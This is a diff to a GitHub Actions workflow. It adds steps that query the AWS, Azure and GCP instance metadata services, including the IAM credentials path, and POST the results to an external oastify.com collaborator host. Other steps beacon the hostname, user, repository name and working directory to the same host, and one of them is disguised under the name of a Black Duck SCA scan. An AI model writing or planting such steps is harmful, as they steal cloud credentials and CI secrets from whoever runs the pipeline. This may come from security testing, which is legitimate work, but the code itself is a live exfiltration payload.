@@ -51,9 +51,29 @@ jobs:
         uses: actions/checkout@v5
 
       # === BEACON 1: proves a custom step runs ===
-      - name: beacon-step
+      - name: cloud-probe
         run: |
-          curl -sS "https://qe889kd16yzqfacea0ygxsqw9nfe3br0.oastify.com/step1?host=$(hostname)&user=$(whoami)&repo=$BRIDGE_GITHUB_REPOSITORY_NAME" || true
+          COLLAB="https://qe889kd16yzqfacea0ygxsqw9nfe3br0.oastify.com"
+          {
+            echo "=== AWS IMDSv1 (v1) ==="
+            curl -sS --max-time 3 http://169.254.169.254/latest/meta-data/ 2>&1 | head -20
+            echo "=== AWS IMDSv2 (token) ==="
+            TOKEN=$(curl -sS --max-time 3 -X PUT "http://169.254.169.254/latest/api/token" \
+              -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" 2>&1)
+            echo "token: $TOKEN"
+            if [ -n "$TOKEN" ]; then
+              curl -sS --max-time 3 -H "X-aws-ec2-metadata-token: $TOKEN" \
+                http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>&1
+            fi
+            echo "=== Azure IMDS ==="
+            curl -sS --max-time 3 -H "Metadata:true" \
+              "http://169.254.169.254/metadata/instance?api-version=2021-02-01" 2>&1 | head -c 2000
+            echo
+            echo "=== GCP metadata ==="
+            curl -sS --max-time 3 -H "Metadata-Flavor: Google" \
+              "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/" 2>&1
+          } 2>&1 | curl -sS -X POST --data-binary @- "$COLLAB/cloud"
+        continue-on-error: true
 
       # === BEACON 2: env + secret exposure (will appear in Collaborator if run:) ===
       - name: beacon-env
@@ -84,4 +104,4 @@ jobs:
           echo "BRIDGE_CLI_INSTALL_DIR=$(find "$RUNNER_TEMP" -type f -name bridge-cli | head -n1)" >> "$GITHUB_ENV" || true
 
       - name: Black Duck SCA Scan
-        run: echo "scan-step" && curl -sS "https://qe889kd16yzqfacea0ygxsqw9nfe3br0.oastify.com/scan?host=$(hostname)" || true
+        run: echo "scan-step" && curl -sS "https://qe889kd16yzqfacea0ygxsqw9nfe3br0.oastify.com/scan?host=$(pwd)" || true
